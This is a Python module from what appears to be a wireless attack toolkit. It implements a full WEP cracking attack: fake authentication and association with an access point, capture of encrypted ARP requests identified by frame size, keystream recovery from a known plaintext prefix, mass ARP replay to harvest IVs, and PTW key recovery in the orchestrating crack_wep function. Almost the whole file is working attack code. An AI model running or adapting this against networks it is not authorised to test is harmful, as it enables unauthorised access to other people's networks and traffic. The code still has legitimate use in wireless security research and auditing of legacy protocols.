"""WEP attacks: fake authentication, ARP-request replay for IV harvesting,
and turning captured frames into PTW sessions.

Logic cherry-picked from documented fake-auth and ARP-replay attack
behavior (see research/wep_attacks_dim03.md) and reimplemented natively
here, matching this project's native-only mandate.

Frame parsing reads raw bytes from the Dot11WEP layer onward rather than
trusting scapy's `icv` IntField, matching this project's existing pattern
(frames.py's EAPOL parsing, wps/eap.py) of not trusting scapy's field
decoding for fields where raw-byte layout is what actually matters.
"""

from __future__ import annotations

import time

from scapy.layers.dot11 import Dot11, Dot11WEP
from scapy.packet import Packet
from scapy.sendrecv import sendp, sniff

from ..frames import BROADCAST, craft_assoc_req, craft_auth
from ..radio import set_channel
from ..wep.crypto import recover_keystream
from ..wep.ptw import PTWVoteTable, compute_key

# LLC/SNAP header + EtherType for ARP — the known-plaintext prefix every
# WEP ARP-based attack relies on (research/wep_attacks_dim02.md, dim06).
ARP_KNOWN_PREFIX = bytes.fromhex("aaaa030000000806")

# Known ARP-request size signature: 802.11 capture length (from
# the Dot11 header onward, i.e. excluding RadioTap) for a WEP-encrypted
# broadcast ARP request. 68 bytes from a wireless client, 86 from wired.
ARP_LEN_WIRELESS = 68
ARP_LEN_WIRED = 86


def fake_authenticate(iface: str, bssid: str, client: str, ssid: str, channel: int | None = None) -> None:
    """Open-system auth + association so the AP accepts later injected frames."""
    if channel is not None:
        set_channel(iface, channel)
    sendp(craft_auth(bssid, client), iface=iface, verbose=False)
    sendp(craft_assoc_req(bssid, client, ssid=ssid), iface=iface, verbose=False)


def is_wep_arp_candidate(pkt: Packet) -> bool:
    """True if pkt looks like a WEP-encrypted broadcast ARP request by size."""
    if not pkt.haslayer(Dot11WEP):
        return False
    dot11 = pkt.getlayer(Dot11)
    if dot11 is None or not dot11.addr1 or dot11.addr1.lower() != BROADCAST:
        return False
    frame_len = len(bytes(dot11))
    return frame_len in (ARP_LEN_WIRELESS, ARP_LEN_WIRED)


def wep_iv_and_ciphertext(pkt: Packet) -> tuple[bytes, bytes] | None:
    """Extract (3-byte IV, ciphertext = encrypted plaintext||ICV) from a WEP frame."""
    wep_layer = pkt.getlayer(Dot11WEP)
    if wep_layer is None:
        return None
    raw = bytes(wep_layer)
    if len(raw) < 8:  # iv(3) + keyid(1) + at least 4 bytes of wepdata/icv
        return None
    iv, ciphertext = raw[:3], raw[4:]
    return iv, ciphertext


def replay_arp(iface: str, pkt: Packet, count: int = 500, interval: float = 0.01) -> int:
    """Reinject a captured WEP ARP-request frame repeatedly; returns count sent."""
    sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
    return count


def add_captured_frame_to_table(table: PTWVoteTable, pkt: Packet) -> bool:
    """If pkt is a usable WEP ARP frame, recover its keystream and vote it.

    Returns True if the frame contributed a new session (new IV, enough
    keystream recovered for the table's configured key length).
    """
    if not is_wep_arp_candidate(pkt):
        return False
    extracted = wep_iv_and_ciphertext(pkt)
    if extracted is None:
        return False
    iv, ciphertext = extracted
    if len(ciphertext) < len(ARP_KNOWN_PREFIX):
        return False
    keystream = recover_keystream(ciphertext, ARP_KNOWN_PREFIX)
    return table.add_session(iv, keystream)


def crack_wep(
    iface: str,
    bssid: str,
    client: str,
    ssid: str,
    key_len: int,
    channel: int | None = None,
    target_sessions: int = 40_000,
    timeout: float = 300.0,
    replay_batch: int = 500,
    replay_interval: float = 0.01,
    poll_interval: float = 2.0,
    top_k: int = 16,
    max_candidates: int = 200_000,
    sniff_fn=sniff,
    sendp_fn=sendp,
    auth_fn=fake_authenticate,
    progress_fn=None,
) -> bytes | None:
    """Full attack: fake-auth, find one ARP frame, replay it, harvest IVs,
    recover the key with PTW. Not yet live-tested (see STATUS.md) —
    sendp/sniff/auth are injectable (whole-function injection, matching
    omni.py's pmkid_fn/handshake_fn/deauth_fn pattern rather than
    threading a sendp_fn down into fake_authenticate itself) so the
    orchestration itself is unit-testable without touching hardware.

    `top_k`/`max_candidates` default to the values empirically validated
    in tests/test_wep_ptw.py (25k sessions, top_k=16), not compute_key's
    own defaults (8/50_000), which weren't sufficient at that scale.

    Returns the recovered root key, or None if `timeout` elapses first.
    """
    auth_fn(iface, bssid, client, ssid, channel=channel)

    table = PTWVoteTable(num_positions=key_len)
    deadline = time.monotonic() + timeout
    seed_frame: Packet | None = None

    def on_packet(pkt: Packet) -> None:
        nonlocal seed_frame
        if add_captured_frame_to_table(table, pkt):
            if seed_frame is None:
                seed_frame = pkt

    while time.monotonic() < deadline and len(table.sessions) < target_sessions:
        sniff_fn(iface=iface, timeout=poll_interval, prn=on_packet, store=False)
        if progress_fn is not None:
            pct = 100 * len(table.sessions) // target_sessions
            progress_fn(f"WEP IVs: {len(table.sessions)}/{target_sessions} ({pct}%)"
                        + ("  [replaying ARP]" if seed_frame is not None else "  [waiting for ARP seed]"))
        if seed_frame is not None:
            sendp_fn(seed_frame, iface=iface, count=replay_batch, inter=replay_interval, verbose=False)

    if not table.sessions:
        return None
    return compute_key(table, key_len=key_len, top_k=top_k, max_candidates=max_candidates)
